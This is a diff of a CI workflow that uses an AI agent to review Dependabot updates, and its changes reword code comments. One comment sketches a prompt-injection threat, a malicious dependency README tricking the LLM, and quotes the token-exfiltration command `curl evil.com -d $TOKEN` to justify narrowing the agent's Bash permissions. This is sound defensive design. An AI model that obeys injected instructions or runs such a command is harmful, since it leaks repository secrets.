@@ -104,7 +104,7 @@ jobs:
           # `gh release view`, `gh run view`, `grep`, plus WebFetch for
           # external changelogs. Without explicit allowlisting every one of
           # those tool calls is denied (33 denials observed on the first
-          # 60-turn run of #469). Scoped to specific Bash subcommands rather
+          # 60-turn run in practice). Scoped to specific Bash subcommands rather
           # than full `Bash` to limit injection blast radius — a malicious
           # dep README cannot trick the LLM into `curl evil.com -d $TOKEN`.
           claude_args: >-
@@ -115,8 +115,8 @@ jobs:
         # claude-code-action can exit 0 without running at all: its OIDC token
         # exchange refuses any run whose workflow file differs from the default
         # branch's copy — which is every Dependabot PR that bumps an action
-        # inside THIS file. PR #1303 sat green-but-unprocessed for a week that
-        # way: review SUCCESS, no comment, no label, gate correctly skipping.
+        # inside THIS file. We've seen a PR sit green-but-unprocessed for a week
+        # that way: review SUCCESS, no comment, no label, gate correctly skipping.
         # Invariant enforced here: every review run ends in exactly one of
         # {V1 comment posted} or {red job + needs-human-review label} — for
         # every silent-failure mode, not just the known one.
@@ -260,8 +260,8 @@ jobs:
           if [ "$DECISION" = "merge" ]; then
             # GitHub refuses an App-authored commit that updates workflow files
             # (GITHUB_TOKEN can never hold the `workflows` permission, and the
-            # check began firing on squash merges of workflow-touching PRs on
-            # 2026-07-01 — #1303's checkout 6→7 bump). A true merge commit
+            # check began firing on squash merges of workflow-touching PRs
+            # (e.g. an actions/checkout major bump). A true merge commit
             # preserves Dependabot's own authored commits, so the workflow
             # change is attributed to Dependabot, not the App. Method is
             # computed here from the changed paths, deterministically.
